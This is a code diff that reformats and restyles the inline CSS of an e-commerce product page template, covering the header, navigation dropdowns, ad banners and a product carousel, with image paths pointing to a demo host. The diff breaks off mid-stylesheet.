@@ -7,86 +7,210 @@
     <!--<link rel="stylesheet" href="http://demo.thankbabe.com/ebay/v1/css/home.css">-->
     <!--<link rel="stylesheet" href="http://demo.thankbabe.com/ebay/v1/css/amazeui.slick.css">-->
     <style type="text/css">
-   /*全局*/
-body { text-align: center; font-family:"微软雅黑", arial;margin:0; padding:0; background: #FFF; font-size:12px; color:#000;}
-div,form,img,ul,ol,li,dl,dt,dd {margin: 0; padding: 0; border: 0; }
-li{list-style-type:none;}
-img{vertical-align:top;}
-h1,h2,h3,h4,h5,h6 { margin:0; padding:0;font-size:12px; font-weight:normal;}
-
-a:link {color: #1f3a87; text-decoration:none;}
-a:visited {color: #83006f;text-decoration:none;}
-a:hover {color: #bc2931; text-decoration:underline;}
-a:active {color: #bc2931;}
-.positoin-r{
-    position: relative;
-}
-.line{
-   border-top: 1px #b7b7b7 solid; 
-   border-bottom: 1px #f7f7f7 solid; 
-}
-/*input::-ms-input-placeholder{text-align: center ;} 
+        /*全局*/
+        
+        body {
+            text-align: center;
+            font-family: "微软雅黑", arial;
+            margin: 0;
+            padding: 0;
+            background: #FFF;
+            font-size: 12px;
+            color: #000;
+        }
+        
+        div,
+        form,
+        img,
+        ul,
+        ol,
+        li,
+        dl,
+        dt,
+        dd {
+            margin: 0;
+            padding: 0;
+            border: 0;
+        }
+        
+        li {
+            list-style-type: none;
+        }
+        
+        img {
+            vertical-align: top;
+        }
+        
+        h1,
+        h2,
+        h3,
+        h4,
+        h5,
+        h6 {
+            margin: 0;
+            padding: 0;
+            font-size: 12px;
+            font-weight: normal;
+        }
+        
+        a:link {
+            color: #1f3a87;
+            text-decoration: none;
+        }
+        
+        a:visited {
+            color: #83006f;
+            text-decoration: none;
+        }
+        
+        a:hover {
+            color: #bc2931;
+            text-decoration: underline;
+        }
+        
+        a:active {
+            color: #bc2931;
+        }
+        
+        .positoin-r {
+            position: relative;
+        }
+        
+        .line {
+            border-top: 1px #e2e2e2 solid;
+        }
+        
+        .red-line {
+            height: 5px;
+            width: 190px;
+            background-color: #f53532;
+            border-radius: 10px;
+            margin: 0 auto;
+            border: 0px;
+            margin-top: 10px;
+        }
+        
+        .clear {
+            clear: both;
+        }
+        /*input::-ms-input-placeholder{text-align: center ;} 
 input::-webkit-input-placeholder{text-align: center;} */
-/*顶部*/
-.top{
-    height: 140px;
-    margin-top:10px;
-    border-top: 1px solid #ededed;
-    border-bottom: 1px solid #ededed;
-}
-.main{
-    width:1120px; 
-    margin: 0px  auto;
-}
-.top .main{
-    height: 100px;
-    margin: 23px  auto;
-}
-.top .logo{
-    float: left;
-    margin-right: 20px;
-}
-.top .logo img{
-    width:230px;
-}
-.top .info {
-    position: relative;
-    float: left;
-    width:500px;
-}
-
-.top .info .service{
-    position: absolute;
-    width: 600px;
-    left:0px; 
-}
-.top .info .service img{
-    width: 850px;
-}
-.top .info .search {
-    position: relative;
-    width:500px; 
-    height:50px; 
-    /*border: 1px solid red;*/
-}
-.top .info .search button{
-    position: absolute;
-    left: 423px;
-    width:70px; 
-    height:36px; 
-    background-color:red;
-    background-image: url("../image/search.png"); 
-    background-repeat:no-repeat;
-    background-position: 20px 8px;
-    border:0px;
-}
-.top .info .search input{
-    position: absolute;
-    left: 0px;
-    width:420px; 
-    height:30px; 
-}
-.top .info .open {
+        
+        .top-info {
+            border-top: 13px solid #F53532;
+            position: relative;
+        }
+        
+        .top-info .main-box {
+            margin: 0px auto;
+            position: relative;
+            width: 1380px;
+            height: 40px;
+        }
+        
+        .top-info .main-box .bg {
+            background-image: url("http://demo.thankbabe.com/ebay/v1/image/top-info.jpg");
+            background-repeat: none;
+            position: relative;
+            top: -13px;
+            z-index: 1;
+            left: 690px;
+            width: 712px;
+            height: 39px;
+        }
+        
+        .top-info .rinfo {
+            position: absolute;
+            height: 30px;
+            z-index: 25;
+            display: block;
+        }
+        
+        .top-info .rinfo-1 {
+            right: 420px;
+            top: -8px;
+            width: 220px;
+        }
+        
+        .top-info .rinfo-2 {
+            width: 370px;
+            top: -8px;
+            right: 25px;
+        }
+        /*顶部*/
+        
+        .top {
+            height: 140px;
+            border-top: 1px solid #ededed;
+            border-bottom: 1px solid #ededed;
+            margin-top: -23px;
+        }
+        
+        .main {
+            width: 1120px;
+            margin: 0px auto;
+        }
+        
+        .top .main {
+            width: 1380px;
+            height: 100px;
+            margin: 23px auto;
+        }
+        
+        .top .logo {
+            float: left;
+            margin-right: 20px;
+        }
+        
+        .top .logo img {
+            width: 230px;
+        }
+        
+        .top .info {
+            position: relative;
+            float: left;
+            width: 1115px;
+        }
+        
+        .top .info .service {
+            position: absolute;
+            width: 600px;
+            left: 0px;
+            top: 25px;
+        }
+        
+        .top .info .service img {
+            width: 720px;
+        }
+        
+        .top .info .search {
+            position: absolute;
+            top: 25px;
+            right: 0px;
+            width: 348px;
+            height: 50px;
+            /*border: 1px solid red;*/
+        }
+        
+        .top .info .search button {
+            position: absolute;
+            right: 0px;
+            width: 70px;
+            height: 36px;
+            background-color: #e7322f;
+            background-image: url("http://demo.thankbabe.com/ebay/v1/image/search.png");
+            background-repeat: no-repeat;
+            background-position: 20px 8px;
+            border: 0px;
+        }
+        
+        .top .info .search input {
+            position: absolute;
+            left: 0px;
+            width: 275px;
+            height: 30px;
+        }
+        /*.top .info .open {
     position: relative;
     color: #ec5d5a;
     font-size: 13px;
@@ -110,908 +234,1151 @@ input::-webkit-input-placeholder{text-align: center;} */
      display: inline-block;
      left: 50px;
      bottom:15px;
-}
-/*顶部-导航*/
-.nav .main{
-     margin: 15px  auto;
-     height: 50px;
-}
-.nav .nav_body_box .nav_item .title {
-    font-size:18px;
-}
-.nav .nav_body_box .nav_item{
-    width:270px;
-    display:block;
-    float:left;
-    margin-left: 1px;
-    position: relative;
-    z-index:3;
-}
-
-
-.nav .nav_item.on .nav_content {
-    display: block;
-}
-.nav .nav_content{
-    position: absolute;
-    /*width: 268px;
-    height: 400px;*/
-    left: 0px;
-    /*border: 1px solid #00b6ff;*/
-    /*background-color: cadetblue;*/
-    display: none;
-    top: 50px;
-    font-size: 15px;
-    text-align: left;
-}
-.nav .nav_content li{
-    line-height: 25px;
-    z-index: 2;
-    text-indent: 1em;
-    width: 200px;
-    display: block;
-}
-.nav .nav_content ul{
-    background-color: #fff;
-    z-index: 2;
-    border: 1px solid rgba(0, 0, 0, 0.2);
-    -webkit-border-radius: 6px;
-    -moz-border-radius: 6px;
-    border-radius: 6px;
-    -webkit-box-shadow: 0 5px 10px rgba(0, 0, 0, 0.2);
-    -moz-box-shadow: 0 5px 10px rgba(0, 0, 0, 0.2);
-    box-shadow: 0 5px 10px rgba(0, 0, 0, 0.2);
-    /*behavior: url(ie-css3.htc);  通知IE浏览器调用脚本作用于'box'类 */
-}
-/*.nav .nav_content .lv2-li,.lv3-li   {
-  display:none;
 }*/
-.nav .nav_content .lv1-box{
-    width: 200px;
-    height: 200px;
-}
-.nav .nav_content .lv1-box li{
-    position: relative;
-}
-.nav .nav_content .lv1-box li a{
-    white-space: nowrap;
-    overflow: hidden;
-    width: 200px;
-    display: block;
-}
-.nav .nav_content .lv1-box li a:hover{
-    background-color: #ECECEC;
-    text-decoration: none;
-}
-.nav .lv1-box{
-    margin-top: 7px;   
-}
-.nav .lv1-box .dropdown-menu{
-    position: absolute;
-    /*border: 1px solid red;*/
-    width: 200px;
-    /*height: 200px;*/
-    left: 200px;
-    display: none;
-    top: 0px;
-}
-
-.nav .lv1-box::before {
-    content: "";
-    display: inline-block;
-    position: absolute;
-    top: 0px;  
-    left: 9px;
-    border-left: 7px solid transparent;
-    border-right: 7px solid transparent;
-    border-bottom: 7px solid rgba(0, 0, 0, 0.2);
-}
-
-.dropdown-submenu>a:after {
-    display: block;
-    content: " ";
-    float: right;
-    width: 0;
-    height: 0;
-    border-color: transparent;
-    border-style: solid;
-    border-width: 5px 0 5px 5px;
-    border-left-color: #cccccc;
-    margin-top: 8px ;
-    margin-right: 3px;
-}
-
-.nav .nav_body_box .nav_item_1{
-   border-bottom:6px solid #00b6ff;
-}
-.nav .nav_body_box .nav_item_1 .title{
-     color:#00b6ff;
-}
-.nav .nav_body_box .nav_item_1.on{
-    border-bottom:6px solid #69D4FF;
-}
-.nav .nav_body_box .nav_item_1.on .title {
-    color: #69D4FF;
-}
-.nav .nav_body_box .nav_item_1.on .nav_content ul{
-    border: 1px solid rgba(0, 182, 255, 0.2);
-    -webkit-box-shadow: 0 5px 10px rgba(0, 0, 0, 0.2);
-    -moz-box-shadow: 0 5px 10px rgba(0, 0, 0, 0.2);
-    box-shadow: 0 5px 10px rgba(0, 182, 255, 0.2);
-}
-.nav .nav_body_box .nav_item_1.on  .lv1-box::before{
-    border-bottom: 7px solid rgba(0, 182, 255, 0.2);
-}
-.nav .nav_body_box .nav_item_1.on .dropdown-submenu>a:after{
-       border-left-color: rgba(0, 182, 255, 0.2);
-}
-
-.nav .nav_body_box .nav_item_1.on li a:hover{
-    background-color: rgba(0, 182, 255, 0.2);
-}
-
-/*.nav .nav_body_box .nav_body_1 {
-    background-color: #00b6ff;
-}*/
-.nav .nav_body_box .nav_item_2{
-   border-bottom:6px solid #57d336;
-}
-.nav .nav_body_box .nav_item_2 .title{
-     color:#57d336;
-}
-.nav .nav_body_box .nav_item_2.on {
-   border-bottom:6px solid  #98DE85;
-}
-.nav .nav_body_box .nav_item_2.on .title{
-     color: #98DE85;
-}
-
-.nav .nav_body_box .nav_item_3{
-   border-bottom:6px solid #ff7800;
-}
-.nav .nav_body_box .nav_item_3  .title{
-     color:#ff7800;
-}
-
-.nav .nav_body_box .nav_item_3.on{
-   border-bottom:6px solid #F9B87E;
-}
-.nav .nav_body_box .nav_item_3.on  .title{
-     color:#F9B87E;
-}
-
-
-.nav .nav_body_box .nav_item_4{
-    border-bottom:6px solid  #fe0005;
-}
-.nav .nav_body_box .nav_item_4  .title{
-     color: #fe0005;
-}
-.nav .nav_body_box .nav_item_4.on{
-    border-bottom:6px solid  #F57578;
-}
-.nav .nav_body_box .nav_item_4.on .title{
-     color: #F57578;
-}
-.nav .title{
-    display: inline-block;
-    text-decoration: none;
-    margin-bottom: 20px;
-}
-.arrow-down {
-    width: 0px;
-    height: 0px;
-    border-left: 4px solid transparent;
-    border-right: 4px solid transparent;
-    border-top: 8px solid #d3d3d6;
-    font-size: 0px;
-    line-height: 0px;
-    margin-left: 2px;
-}
-.nav .nav_body{
-    position: absolute;
-    border: 1px solid #bc2931;
-    left: 0px;
-    width: 275px;
-    height: 400px;
-    z-index: 100px;
-    display: none;
-}
-.top_ad{
-    height: 350px;
-    background-color: #f1f1f1;
-}
-.top_ad .main{
-    height: 300px;
-    padding-top: 20px;
-}
-.top_ad .main .ad_item{
-    margin-left:2px;
-}
-.top_ad .ad_left{
-    float: left;
-    width: 500px;
-    height: 300px;
-    /*background-color: #00b6ff;*/
-}
-.top_ad .ad_center{
-    float: left;
-    width: 300px;
-    height: 300px;
-    /*background-color:#1f3a87;*/
-}
-.top_ad .ad_right{
-    float: left;
-    width: 280px;
-    height: 300px;
-    /*background-color:#9c00ff;*/
-}
-.top_ad .ad_right div{
-    width: 275px;
-    height: 145px;
-    /*background-color:#ec5d5a;*/
-    margin: 2px;
-}
-.also_like{
-    position: relative;
-}
-.also_like .main{
-    height: 430px;
-}
-.also_like .main .title{
-   color: #f53532;
-    font-size: 25px;
-    font-weight: 800;
-}
-.also_like .like_box {
-    width: 900px;
-    margin: 0 auto;
-}
-.also_like .like_box .data{
-    height: 300px;
-}
-.also_like  .title{
-    margin-top: 20px;
-    margin-bottom: 20px;
-}
-
-.also_like .like_box .good_item{
-    margin: 10px 10px;
-    -webkit-box-shadow: 0 0 15px #C9C7C7;  
-    -moz-box-shadow: 0 0 15px #C9C7C7;  
-    box-shadow: 0 0 15px #C9C7C7;
-    width: 200px;
-    height: 280px;
-    float: left;
-}
-.also_like .like_box .good_item .desc{
-    color: #979797;
-    font-weight: 600;
-    font-size: 14px;
-    margin: 0px 10px 0px 10px;
-}
-
-.also_like .like_box .good_item .price{
-    font-size: 26px;
-    font-weight: 900;
-    color: #FA6363;
-    margin: 10px 10px 0px 10px;
-}
-.also_like .like_box .good_item img{
-    margin: 10px auto;
-    width: 180px;
-    height: 180px;
-}
-.also_like .like_box .good_item .info span{
-    display: block;
-}
-.also_like .like_box .data{
-    width:900px;
-}
-.also_like .like_box .slick-prev{
-    width: 28px;
-    height: 67px;
-    background-image: url("../image/btn_left.jpg");
-    top:40%;
-    left:-80px
-}
-.also_like .like_box .slick-next{
-    width: 28px;
-    height: 67px;
-    background-image: url("../image/btn_right.jpg");
-    top:40%;
-    right: -80px;
-}
-/*价格计算*/
-.shopping_cost {
-    height:68px;
-    width:1120px; 
-    -webkit-box-shadow: 0 0 15px #C9C7C7;  
-    -moz-box-shadow: 0 0 15px #C9C7C7;  
-    box-shadow: 0 0 15px #C9C7C7;
-    position: absolute;
-    bottom: -30px;
-    background-color: #FFF;
-    background-image:  url("../image/express.jpg");
-    background-repeat: no-repeat;
-    left: 0px;
-}
-.shopping_cost .desc{
-    color: red;
-    position: absolute;
-    font-size: 25px;
-    font-weight: bolder;
-    left: 340px;
-    top: 15px;
-    display: block;
-    
-}
-.shopping_cost .inp{
-    position: absolute;
-    display: block;
-    left: 545px;
-    top: 15px;
-}
-.shopping_cost .inp input{
-    height: 25px;
-    width: 210px;
-    background-color: #e1e1e1;
-    border: 0px;
-}
-.shopping_cost .inp .price{
-    color: red;
-    font-size: 18px;
-    margin-left: 10px;
-}
-.shopping_cost .inp .price_num{
-    color: red;
-    font-size: 25px;
-}
-
-.good_info{
-    background-color: #e1e1e1;
-    height: 1100px;
-}
-
-/*图片详情*/
-.good_info {
-    padding-top: 80px;
-}
-.good_info .img_box{
-    position: absolute;
-    left: 0px;
-    top: 0px;
-    width:510px;
-}
-.good_info .tb-s40 img{
-    max-width: 60px;
-}
-
-
-.tb-pic {
-    background: #ffffff;
-}
-.tb-pic a{
-    display:table-cell;
-    text-align:center;
-    vertical-align:middle;
-}
-.tb-pic a img{
-    vertical-align:middle;
-}
-.tb-pic a{*display:block;*font-family:Arial;*line-height:1;}
-.tb-thumb{margin:10px 0 0;overflow:hidden;}
-.tb-thumb li{
-    background:none repeat scroll 0 0 transparent;
-    float:left;
-    height:65px;
-    margin:0 6px 0 0;
-    overflow:hidden;
-    padding:1px;
-    border:1px solid #CDCDCD;
-}
-.tb-s310, .tb-s310 a{
-    height:500px;
-    width:500px;
-}
-.tb-s310, .tb-s310 img{
-    max-height:500px;
-    max-width:500px;
-}
-.tb-s310 a{*font-size:271px;}
-.tb-s40 a{*font-size:35px;}
-.tb-s40, .tb-s40 a{
-    height:66px;
-    width:66px;
-}
-.tb-booth{
-    /*border:1px solid #CDCDCD;*/
-    position:relative;
-    z-index:1;
-}
-.tb-thumb .tb-selected{
-    /*background:none repeat scroll 0 0 #C30008;*/
-    /*height:66px;*/
-    /*padding:2px;*/
-    border:1px solid #C30008;
-}
-.tb-thumb .tb-selected div{
-    background-color:#FFFFFF;
-    border:medium none;
-}
-.zoomDiv{
-    z-index:999;
-    position:absolute;
-    top:0px;
-    left:0px;
-    width:200px;
-    height:200px;
-    background:#ffffff;
-    border:1px solid #CCCCCC;
-    display:none;
-    text-align:center;
-    overflow:hidden;
-}
-.zoomMask{
-    position:absolute;
-    background:url("../image/mask.png") repeat scroll 0 0 transparent;
-    cursor:move;z-index:1;
-}
-.good_info .main{
-    position: relative;
-}
-
-.good_info .content{
-    position: absolute;
-    top:0px;
-    left: 550px;
-    width: 550px;
-    margin-left: 50px;
-}
-.good_info .content ul{
-    margin-top: 20px;
-    margin-bottom: 20px;
-}
-.good_info .content li{
-    list-style-type: disc;
-    font-size: 14px;
-    text-align: left;
-    color: #686262;
-    margin-bottom: 5px;
-}
-.good_info .content span{
-    display: block;
-    text-align: left;
-}
-.good_info .content .content-item{
-    margin-bottom: 20px
-}
-
-.good_info .content-desc .title{
-    font-size: 20px;
-    color: #393939;
-    font-weight: bold;
-}
-.good_info .content-desc .desc{
-    font-size: 14px;
-    color: rgba(87, 87, 87, 0.34)
-}
-
-
-.good_info .content-sp .title{
-    font-size: 20px;
-    color: red;
-    font-weight: bold;
-}
-
-.good_info .content-pack .title{
-    font-size: 20px;
-    color: red;
-    font-weight: bold;
-}
-.good_info .video{
-    position: absolute;
-    left: 0px;
-    top: 655px;
-    width: 500px;
-    height: 370px;
-    background-color: #000;
-}
-
-/*特性 feature*/
-.feature{
-    background-color: #e1e1e1;
-}
-.feature .main{
-    min-height: 1550px;
-}
-.feature .item-box{
-    float: left;
-    margin-right:20px;
-    margin-top: 40px;
-    width: 537px;
-    height: 670px;
-}
-.feature .item-box .desc{
-    background-color: #bb1a20;
-    height: 105px;
-    color: #000000;
-    font-weight: bold;
-    font-size: 35px;
-    text-align: left;
-    padding: 20px;
-}
-.feature .item-box img{
-    width: 537px;
-    height: 524px;
-}
-.feature .title{
-    padding: 20px 0px;
-    color: red;
-    font-size: 25px;
-    font-weight: bold;
-    text-align: center;
-}
-
-.feature .tabledetail td img{
-    width: 537px;
-    height: 524px;
-    margin-right: 15px;
-    margin-bottom: 15px;
-}
-
-/*底部导航*/
-.footer{
-     background-color: #EDEDED;
-}
-.footer .main{
-    height: 670px;
-    padding-top: 20px;
-}
-.footer .nav-footer{
-    background-color: #fafafa;
-    height: 50px;
-    box-shadow: 0 0 15px #C9C7C7;
-    border-radius: 6px;
-    line-height: 50px;
-}
-.nav-footer ul {
-    height: 50px;
-}
-.nav-footer ul li {
-    width: 223px;
-    display: block;
-    float: left;
-    margin-right: 1px;
-    position: relative;
-    font-size: 18px;
-}
-
-.nav-footer .on{
-    background-color: #ed3330;
-    /*border-radius: 2px;*/
-    color: #fff;
-}
-.nav-footer .nav-content {
-    height: 320px;
-}
-.nav-footer .nav-content .content-item{
-    height: 320px;
-    /*border: 1px solid #000;   */
-    display: none; 
-    margin-top: 40px;
-}
-
-.nav-content .content-item .about-img-1{
-    margin-right: 10px;
-}
-.nav-content .content-item .about-img-2{
-    margin-right: 10px;
-}
-.nav-content .content-item .about-desc{
-    text-align: left;
-    line-height: 30px;   
-    color: #5f5f5f;
-    font-size: 14px;
-    margin-top: 10px; 
-}
-.nav-footer .select .arrows{
-    display: block;
-    width: 0px;
-    height: 0px;
-    position: absolute;
-    left: 107px;
-    border-left: 8px solid transparent;
-    border-right: 8px solid transparent;
-    border-top: 8px solid #ED3330;
-} 
-.nav-footer .figure{
-   position: relative;
-}
-.nav-footer .figure img{
-   position: absolute;
-}
-.nav-footer .figure .figure-img1{
-    top: 5px;
-    left: 0px;
-}
-.nav-footer .figure .figure-img2{
-   top: 3px;
-   left: 455px;
-}
-.nav-footer .figure .figure-img3{
-    top: 0px;
-    right:0px;
-}
-
-
-/*底部内容*/
-.footer-bottom .content{
-    height: 105px;
-    font-size: 14px;
-    color: rgba(70, 70, 70, 0.47);
-}
-.footer-bottom .content span{
-    display: inline-block;
-    width: 105px;
-    line-height: 100px;
-}
-.footer-bottom .content a{
-    color: rgba(70, 70, 70, 0.47);
-}
-
-
-
-
-
-
-
-
-
-
-/*amazui*/
-/*! Amaze UI Plugin ~ slick */
-/* Slider */
-.slick-slider {
-  position: relative;
-  display: block;
-  box-sizing: border-box;
-  -webkit-user-select: none;
-     -moz-user-select: none;
-      -ms-user-select: none;
-          user-select: none;
-  -ms-touch-action: pan-y;
-      touch-action: pan-y;
-  -webkit-tap-highlight-color: transparent;
-}
-.slick-list {
-  position: relative;
-  overflow: hidden;
-  display: block;
-  margin: 0;
-  padding: 0;
-}
-.slick-list:focus {
-  outline: none;
-}
-.slick-list.dragging {
-  cursor: hand;
-}
-.slick-slider .slick-track,
-.slick-slider .slick-list {
-  -webkit-transform: translate3d(0, 0, 0);
-          transform: translate3d(0, 0, 0);
-}
-.slick-track {
-  position: relative;
-  left: 0;
-  top: 0;
-  display: block;
-}
-.slick-track:before,
-.slick-track:after {
-  content: "";
-  display: table;
-}
-.slick-track:after {
-  clear: both;
-}
-.slick-loading .slick-track {
-  visibility: hidden;
-}
-.slick-slide {
-  float: left;
-  height: 100%;
-  min-height: 1px;
-  display: none;
-}
-[dir="rtl"] .slick-slide {
-  float: right;
-}
-.slick-slide img {
-  display: block;
-}
-.slick-slide.slick-loading img {
-  display: none;
-}
-.slick-slide.dragging img {
-  pointer-events: none;
-}
-.slick-initialized .slick-slide {
-  display: block;
-}
-.slick-loading .slick-slide {
-  visibility: hidden;
-}
-.slick-vertical .slick-slide {
-  display: block;
-  height: auto;
-  border: 1px solid transparent;
-}
-/* Slider */
-/* Arrows */
-.slick-prev,
-.slick-next {
-  position: absolute;
-  display: block;
-  height: 20px;
-  width: 20px;
-  line-height: 0;
-  font-size: 0;
-  cursor: pointer;
-  background: transparent;
-  color: transparent;
-  top: 50%;
-  margin-top: -10px;
-  padding: 0;
-  border: none;
-  outline: none;
-}
-.slick-prev:hover,
-.slick-next:hover,
-.slick-prev:focus,
-.slick-next:focus {
-  outline: none;
-  background: transparent;
-  color: transparent;
-}
-.slick-prev:hover:before,
-.slick-next:hover:before,
-.slick-prev:focus:before,
-.slick-next:focus:before {
-  opacity: 1;
-}
-.slick-prev.slick-disabled:before,
-.slick-next.slick-disabled:before {
-  opacity: 0.25;
-}
-.slick-prev:before,
-.slick-next:before {
-  font-family: "FontAwesome";
-  font-size: 20px;
-  line-height: 1;
-  color: #0e90d2;
-  opacity: 0.75;
-  -webkit-font-smoothing: antialiased;
-  -moz-osx-font-smoothing: grayscale;
-}
-.slick-prev {
-  left: -25px;
-}
-[dir="rtl"] .slick-prev {
-  left: auto;
-  right: -25px;
-}
-.slick-prev:before {
-  /*content: "\f137";*/
-}
-[dir="rtl"] .slick-prev:before {
-  /*content: "\f138";*/
-}
-.slick-next {
-  right: -25px;
-}
-[dir="rtl"] .slick-next {
-  left: -25px;
-  right: auto;
-}
-.slick-next:before {
-  /*content: "\f138";*/
-}
-[dir="rtl"] .slick-next:before {
-  /*content: "\f137";*/
-}
-/* Dots */
-.slick-slider {
-  margin-bottom: 30px;
-}
-.slick-dots {
-  position: absolute;
-  bottom: -45px;
-  list-style: none;
-  display: block;
-  text-align: center;
-  padding: 0;
-  width: 100%;
-}
-.slick-dots li {
-  position: relative;
-  display: inline-block;
-  height: 20px;
-  width: 20px;
-  margin: 0 5px;
-  padding: 0;
-  cursor: pointer;
-}
-.slick-dots li button {
-  border: 0;
-  background: transparent;
-  display: block;
-  height: 20px;
-  width: 20px;
-  outline: none;
-  line-height: 0;
-  font-size: 0;
-  color: transparent;
-  padding: 5px;
-  cursor: pointer;
-}
-.slick-dots li button:hover,
-.slick-dots li button:focus {
-  outline: none;
-}
-.slick-dots li button:hover:before,
-.slick-dots li button:focus:before {
-  opacity: 1;
-}
-.slick-dots li button:before {
-  position: absolute;
-  top: 0;
-  left: 0;
-  content: "•";
-  width: 20px;
-  height: 20px;
-  font-size: 32px;
-  line-height: 20px;
-  text-align: center;
-  color: #0e90d2;
-  opacity: 0.25;
-  -webkit-font-smoothing: antialiased;
-  -moz-osx-font-smoothing: grayscale;
-}
-.slick-dots li.slick-active button:before {
-  color: #0e90d2;
-  opacity: 0.75;
-}
-
+        /*顶部-导航*/
+        
+        .nav {
+            box-shadow: 0px 5px 12px rgb(236, 240, 243);
+            margin-bottom: 10px;
+            margin-top: 10px;
+        }
+        
+        .nav .main {
+            margin: 0px auto;
+            height: 50px;
+            position: relative;
+        }
+        
+        .nav .nav_body_box .nav_item .title {
+            font-size: 18px;
+        }
+        
+        .nav .nav_body_box .nav_item {
+            width: 279px;
+            display: block;
+            float: left;
+            margin-left: 1px;
+            z-index: 5;
+        }
+        
+        .nav .nav_body_box .nav_item_1.on {
+            border-bottom: 6px solid #69D4FF;
+        }
+        
+        .nav .nav_body_box .nav_item_1.on .title {
+            color: #69D4FF;
+        }
+        
+        .nav .nav_item.on .nav_content {
+            display: block;
+        }
+        
+        .nav .nav_content {
+            left: 0px;
+            position: absolute;
+            display: none;
+            font-size: 15px;
+            text-align: left;
+            width: 1120px;
+            height: 335px;
+            z-index: 3;
+            top: 40px;
+        }
+        
+        .nav .content-detail {
+            padding-left: 20px;
+            width: 1100px;
+            height: 335px;
+            margin-top: 20px;
+            -webkit-box-shadow: 0 0 50px #C9C7C7;
+            -moz-box-shadow: 0 0 50px #C9C7C7;
+            box-shadow: 0 0 50px #C9C7C7;
+            background-color: #ffffff;
+        }
+        
+        .nav .content-detail ul li {
+            float: left;
+            width: 220px;
+        }
+        
+        .nav .content-detail .detail-box {
+            margin-top: 10px;
+        }
+        
+        .nav .content-detail .detail-box div img{
+            width: 19px;
+            height: 19px;
+            margin-right: 5px; 
+        }
+        
+        .nav .content-detail .detail-item {
+            color: #9d9d9d;
+            line-height: 30px;
+        }
+        
+        .dropdown-submenu>a:after {
+            display: block;
+            content: " ";
+            float: right;
+            width: 0;
+            height: 0;
+            border-color: transparent;
+            border-style: solid;
+            border-width: 5px 0 5px 5px;
+            border-left-color: #cccccc;
+            margin-top: 8px;
+            margin-right: 3px;
+        }
+        
+        .nav .nav_body_box .nav_item_1 {
+            border-bottom: 6px solid #00b6ff;
+        }
+        
+        .nav .nav_body_box .nav_item_1 .title {
+            color: #00b6ff;
+        }
+        
+        .nav .nav_body_box .nav_item_2 {
+            border-bottom: 6px solid #57d336;
+        }
+        
+        .nav .nav_body_box .nav_item_2 .title {
+            color: #57d336;
+        }
+        
+        .nav .nav_body_box .nav_item_2.on {
+            border-bottom: 6px solid #98DE85;
+        }
+        
+        .nav .nav_body_box .nav_item_2.on .title {
+            color: #98DE85;
+        }
+        
+        .nav .nav_body_box .nav_item_3 {
+            border-bottom: 6px solid #ff7800;
+        }
+        
+        .nav .nav_body_box .nav_item_3 .title {
+            color: #ff7800;
+        }
+        
+        .nav .nav_body_box .nav_item_3.on {
+            border-bottom: 6px solid #F9B87E;
+        }
+        
+        .nav .nav_body_box .nav_item_3.on .title {
+            color: #F9B87E;
+        }
+        
+        .nav .nav_body_box .nav_item_4 {
+            border-bottom: 6px solid #e3312e;
+        }
+        
+        .nav .nav_body_box .nav_item_4 .title {
+            color: #e3312e;
+        }
+        
+        .nav .nav_body_box .nav_item_4.on {
+            border-bottom: 6px solid #F57578;
+        }
+        
+        .nav .nav_body_box .nav_item_4.on .title {
+            color: #F57578;
+        }
+        
+        .nav .title {
+            display: inline-block;
+            text-decoration: none;
+            margin-bottom: 20px;
+        }
+        
+        .arrow-down {
+            width: 0px;
+            height: 0px;
+            border-left: 4px solid transparent;
+            border-right: 4px solid transparent;
+            border-top: 8px solid #d3d3d6;
+            font-size: 0px;
+            line-height: 0px;
+            margin-left: 2px;
+        }
+        
+        .nav .nav_body {
+            position: absolute;
+            border: 1px solid #bc2931;
+            left: 0px;
+            width: 275px;
+            height: 400px;
+            z-index: 100px;
+            display: none;
+        }
+        
+        .top_ad {
+            height: 350px;
+            background-color: #ffffff;
+            overflow: hidden;
+        }
+        
+        .top_ad .main {
+            height: 300px;
+            padding-top: 20px;
+        }
+        
+        .top_ad .main .ad_item {
+            margin-left: 2px;
+        }
+        
+        .top_ad .ad_left {
+            float: left;
+            width: 500px;
+            height: 300px;
+        }
+        
+        .top_ad .ad_center {
+            float: left;
+            width: 300px;
+            height: 300px;
+        }
+        
+        .top_ad .ad_right {
+            float: left;
+            width: 280px;
+            height: 300px;
+        }
+        
+        .top_ad .ad_right div {
+            width: 275px;
+            height: 145px;
+            margin: 2px;
+        }
+        
+        .also_like {
+            position: relative;
+            margin-bottom: 30px;
+        }
+        
+        .also_like .line {
+            height: 5px;
+            width: 190px;
+            background-color: #e5e5e5;
+            border-radius: 10px;
+            margin: 0 auto;
+            margin-bottom: 10px;
+            border: 0px;
+        }
+        
+        .also_like .main {
+            height: 375px;
+            overflow: hidden;
+        }
+        
+        .also_like .main .title {
+            color: #f53532;
+            font-size: 25px;
+            font-weight: 800;
+        }
+        
+        .also_like .like_box {
+            width: 900px;
+            margin: 0 auto;
+        }
+        
+        .also_like .like_box .data {
+            height: 300px;
+        }
+        
+        .also_like .title {
+            margin-top: 20px;
+            margin-bottom: 10px;
+        }
+        
+        .also_like .like_box .good_item {
+            margin: 10px 10px;
+            -webkit-box-shadow: 0 0 15px #C9C7C7;
+            -moz-box-shadow: 0 0 15px #C9C7C7;
+            box-shadow: 0 0 15px #C9C7C7;
+            width: 200px;
+            height: 280px;
+            float: left;
+        }
+        
+        .also_like .like_box .good_item .desc {
+            color: #979797;
+            font-weight: 600;
+            font-size: 14px;
+            margin: 0px 10px 0px 10px;
+        }
+        
+        .also_like .like_box .good_item .desc a {
+            display: -webkit-box;
+            -webkit-line-clamp: 2;
+            text-align: left;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            -webkit-box-orient: vertical;
+            height: 40px;
+        }
+        
+        .also_like .like_box .good_item .price {
+            font-size: 26px;
+            font-weight: 900;
+            color: #FA6363;
+            margin: 2px 10px 0px 10px;
+        }
+        
+        .also_like .like_box .good_item img {
+            margin: 10px auto;
+            width: 180px;
+            height: 180px;
+        }
+        
+        .also_like .like_box .good_item .info span {
+            display: block;
+        }
+        
+        .also_like .like_box .data {
+            width: 900px;
+        }
+        
+        .also_like .like_box .slick-prev {
+            width: 28px;
+            height: 67px;
+            background-image: url("http://demo.thankbabe.com/ebay/v1/image/btn_left.jpg");
+            top: 40%;
+            left: -80px;
+            border-radius: 8px 0px 0px 8px;
+        }
+        
+        .also_like .like_box .slick-next {
+            width: 28px;
+            height: 67px;
+            background-image: url("http://demo.thankbabe.com/ebay/v1/image/btn_right.jpg");
+            top: 40%;
+            right: -80px;
+            border-radius: 0px 8px 8px 0px;
+        }
+        /*价格计算*/
+        
+        .shopping_cost {
